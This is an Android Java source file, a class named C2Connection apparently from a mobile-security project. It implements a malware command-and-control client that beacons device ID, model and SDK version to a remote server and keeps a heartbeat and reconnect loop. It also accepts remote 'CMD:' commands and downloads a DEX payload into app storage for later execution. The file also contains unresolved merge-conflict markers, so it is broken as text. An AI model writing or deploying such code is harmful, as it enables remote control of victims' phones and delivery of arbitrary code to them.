package com.example.mobsec_823;

import android.content.Context;
import android.util.Log;
import android.os.Build;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class C2Connection {
    private static final String TAG = "C2Connection";
    private final String serverIp;
    private final int serverPort;
    private final CommandListener listener;
    private final Context context;
    private final String deviceId;
    private Socket socket;
    private PrintWriter out;
    private InputStream in;
    private volatile boolean isRunning = false;

    public interface CommandListener {
        void onCommandReceived(String command);
        void onPayloadReceived(String filePath);
    }

    public C2Connection(Context context, String ip, int port, String deviceId, CommandListener listener) {
        this.context = context;
        this.serverIp = ip;
        this.serverPort = port;
        this.deviceId = deviceId;
        this.listener = listener;
    }

    public void start() {
        if (isRunning) return;
        isRunning = true;

        new Thread(() -> {
            while (isRunning) {
                try {
                    connect();
                    listenForData();
                } catch (Exception e) {
                    Log.e(TAG, "Connection lost, retrying in 5 seconds...", e);
                    cleanupSocket();
                    try {
                        Thread.sleep(5000);
                    } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
        }).start();

        // Heartbeat thread
        new Thread(() -> {
            while (isRunning) {
                try {
                    Thread.sleep(30000); // 30-second heartbeat
                    sendData("HEARTBEAT");
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "Heartbeat failed", e);
                }
            }
        }).start();
    }

    private void connect() throws Exception {
        Log.d(TAG, "Connecting to " + serverIp + ":" + serverPort);
        socket = new Socket(serverIp, serverPort);
        out = new PrintWriter(socket.getOutputStream(), true);
        in = socket.getInputStream();
        String hello = "ID:" + deviceId
                + ";MODEL:" + Build.MODEL
                + ";SDK:" + Build.VERSION.SDK_INT;
        sendLine(hello);
        Log.d(TAG, "Connected successfully");
    }

    private void listenForData() throws Exception {
        BufferedReader reader = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8));
        String line;
        while (isRunning && (line = reader.readLine()) != null) {
            Log.d(TAG, "Received data: " + line);
            if ("PAYLOAD_START".equals(line)) {
                Log.i(TAG, "Payload signal detected. Starting DEX file download...");
                receivePayload();
            } else if (line.startsWith("CMD:")) {
                if (listener != null) {
                    listener.onCommandReceived(line.substring(4));
                }
            }
        }
    }

    private void receivePayload() {
        try {
            DataInputStream dataInputStream = new DataInputStream(in);
            long fileSize = dataInputStream.readLong();
            Log.d(TAG, "Expecting payload size: " + fileSize + " bytes");

            String filePath = context.getFilesDir().getAbsolutePath() + "/payload.dex";
            try (FileOutputStream fos = new FileOutputStream(filePath)) {
                byte[] buffer = new byte[8192];
                int bytesRead;
                long totalBytesRead = 0;

<<<<<<< Updated upstream
                while (totalBytesRead < fileSize && 
                       (bytesRead = in.read(buffer, 0, (int)Math.min(buffer.length, fileSize - totalBytesRead))) != -1) {
                    fos.write(buffer, 0, bytesRead);
                    totalBytesRead += bytesRead;
                }
                
=======
                while (totalBytesRead < fileSize &&
                        (bytesRead = in.read(buffer, 0, (int)Math.min(buffer.length, fileSize - totalBytesRead))) != -1) {
                    fos.write(buffer, 0, bytesRead);
                    totalBytesRead += bytesRead;
                }

>>>>>>> Stashed changes
                if (totalBytesRead == fileSize) {
                    Log.i(TAG, "Payload successfully saved to: " + filePath);
                    if (listener != null) {
                        listener.onPayloadReceived(filePath);
                    }
                } else {
<<<<<<< Updated upstream
                     Log.e(TAG, "Payload download incomplete. Expected " + fileSize + " but got " + totalBytesRead);
=======
                    Log.e(TAG, "Payload download incomplete. Expected " + fileSize + " but got " + totalBytesRead);
>>>>>>> Stashed changes
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to receive or save payload", e);
        }
    }

    public void sendData(String data) {
        new Thread(() -> {
            sendLine(data);
        }).start();
    }

    private synchronized void sendLine(String data) {
        if (out != null) {
            out.println(data);
        }
    }

    public void stop() {
        isRunning = false;
        cleanupSocket();
    }

    private void cleanupSocket() {
        try {
            if (socket != null) {
                socket.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error closing socket", e);
        }
    }
}
